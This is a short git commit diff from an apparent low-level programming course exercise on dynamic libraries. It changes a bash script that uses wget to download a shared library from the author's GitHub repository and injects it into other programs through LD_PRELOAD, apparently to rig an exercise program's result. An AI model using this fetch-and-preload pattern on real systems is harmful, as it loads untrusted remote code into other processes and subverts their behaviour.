6ced29ea61b3b40d515f088dc23ffd2804a28bfc
thinktank01 <felixayot@gmail.com>
2023-06-19 23:30:05 +0300

    Modify cops and libinjection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/101-code_injection.so https://github.com/felixayot/alx-low_level_programming/blob/master/0x18-dynamic_libraries/101-code_injection.so
-export LD_PRELOAD=/tmp/101-code_injection.so
+wget -O /tmp/libinjection.so https://github.com/felixayot/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libinjection.so
+export LD_PRELOAD=/tmp/libinjection.so
